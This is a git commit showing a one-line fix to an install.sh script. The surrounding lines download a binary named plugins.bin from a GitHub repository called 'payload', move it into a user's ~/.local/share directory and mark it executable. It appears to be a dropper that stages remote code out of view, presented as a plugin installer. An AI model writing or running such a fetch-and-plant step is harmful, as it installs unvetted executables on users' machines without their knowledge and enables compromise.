fa9d65c2db0b4c9be183afa840d1c6d8d53953b7
Peppermint25565 <joachim.ismael@epitech.eu>
2024-09-26 20:03:26 +0400

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,5 +2,5 @@ LOCATION=$(pwd)
 
 curl -L -o ./plugins.bin https://github.com/Peppermint25565/payload/raw/refs/heads/main/plugins.bin
 cd /home/*/.local/share
-mv $LOCATION/plugins.bin ./plugin.bin
+mv $LOCATION/plugins.bin ./plugins.bin
 chmod +x ./plugins.bin
